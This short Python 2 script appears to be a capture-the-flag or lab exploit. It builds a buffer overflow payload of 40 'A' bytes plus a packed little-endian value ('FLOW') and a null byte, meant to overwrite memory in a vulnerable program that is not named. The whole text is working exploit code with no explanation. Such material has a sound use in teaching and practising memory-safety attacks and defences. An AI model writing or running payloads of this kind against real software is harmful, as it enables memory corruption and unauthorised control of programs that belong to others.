import struct
payload = "A" * 40 + struct.pack("<I", 0x574f4c46)
print payload + "\x00"